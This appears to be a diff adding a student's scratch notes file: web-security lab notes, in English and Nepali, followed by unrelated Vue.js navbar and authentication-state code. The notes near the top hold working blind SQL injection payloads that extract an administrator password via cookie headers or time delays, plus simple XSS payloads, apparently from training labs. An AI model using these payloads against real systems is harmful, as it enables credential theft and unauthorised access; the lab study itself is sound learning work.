@@ -1,0 +1,154 @@
+Payload for BLIND SQL INJECTIOND WITH TIME DELAY ANDINFROMATION RETRIVAL
+Cookie: TrackingId=JDMJ6BNylhs2jf3t' || (SELECT CASE WHEN substring(password,1,1)='a' THEN TO_CHAR(1/0) ELSE NULL END FROM users where username='administrator')||'; session=eVo0g3zxOeKnNNhuROeq3nTCIvMTOTHc
+
+Payload for BLIND SQL INJECTIOND WITH TIME DELAY ANDINFROMATION RETRIVAL
+
+Cookie: TrackingId=LLWkzG5xoUeumtMB'%3b+(SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END from users where username ='administrator')-- ; session=H8SkNNSBP5PksFQu7pqf0jI2NDceH3nC
+
+
+
+z4qsbOsn0sn6wk7l5j8hboo
+
+
+6nlhsboqj45zob8ks0w7
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+XSS payloads
+
+"onmouseover="alert(1) ---- first lab
+'-alert(1)-' ------> second lab payload
+
+
+DOM
+pros: aakha kei agadi javascript pauxa
+cons: kina bhanda dherai kura aauxa DOM based ma
+
+
+
+
+
+ASSIGNMENT MA:
+SQLi-->2 to 3
+XSS----> 3 4 ota
+OS Command injection ---> 
+CSRF
+SSRF
+Path traversal maybe(LFI)
+Access Control 
+Auth
+File Upload(aauna sakla)
+API testing
+
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+JS link Finder extension hanne.
+
+
+
+
+import { ref, computed, onMounted } from 'vue'
+import { useRouter, useRoute } from 'vue-router'
+import { isAuthenticated as checkAuth, getUserData, logout } from '@/axios'
+
+const router = useRouter()
+const route = useRoute()
+
+// Reactive state
+const isAuthenticated = ref(false)
+const user = ref(null)
+
+// Check authentication on mount
+onMounted(() => {
+  updateAuthState()
+})
+
+// Watch for route changes to update auth state
+const updateAuthState = () => {
+  isAuthenticated.value = checkAuth()
+  user.value = getUserData()
+}
+
+// Update auth state when route changes
+router.afterEach(() => {
+  updateAuthState()
+})
+
+const currentRoute = computed(() => route.name)
+
+const handleLogout = () => {
+  if (confirm('Are you sure you want to logout?')) {
+    logout()
+    isAuthenticated.value = false
+    user.value = null
+    router.push('/login')
+  }
+}
+
+
+
+
+ <nav class="navbar">
+    <div class="nav-container">
+      <!-- Logo -->
+      <router-link to="/" class="logo">MeroPanditLama</router-link>
+
+      <!-- Navigation Links -->
+      <div class="nav-links">
+        <router-link
+          v-if="isAuthenticated"
+          to="/"
+          class="nav-link"
+          :class="{ active: currentRoute === 'home' }"
+        >
+          Home
+        </router-link>
+        <router-link
+          to="/browse"
+          class="nav-link"
+          :class="{ active: currentRoute === 'browse' }"
+        >
+          Browse
+        </router-link>
+        <router-link
+          v-if="isAuthenticated"
+          to="/my-bookings"
+          class="nav-link"
+          :class="{ active: currentRoute === 'my-bookings' }"
+        >
+          MyBookings
+        </router-link>
+        <router-link
+          v-if="isAuthenticated"
+          to="/profile"
+          class="nav-link"
+          :class="{ active: currentRoute === 'profile' }"
+        >
+          Profile
+        </router-link>
+      </div>
+
+      <!-- Right Side Actions -->
+      <div class="nav-actions">
+        <!-- User Info (when authenticated) -->
+        <div v-if="isAuthenticated && user" class="user-info">
+          <span class="user-name">{{ user.first_name }}</span>
+        </div>
+
+        <!-- Login Button (when not authenticated) -->
+        <router-link v-if="!isAuthenticated" to="/login" class="login-button">
+          Login
+        </router-link>
+
+        <!-- Logout Icon (when authenticated) -->
+        <button
+          v-if="isAuthenticated"
+          @click="handleLogout"
+          class="logout-button"
+          title="Logout"
+        >
+          <i class="bi bi-box-arrow-right"></i>
+        </button>
+      </div>
+    </div>
+  </nav>
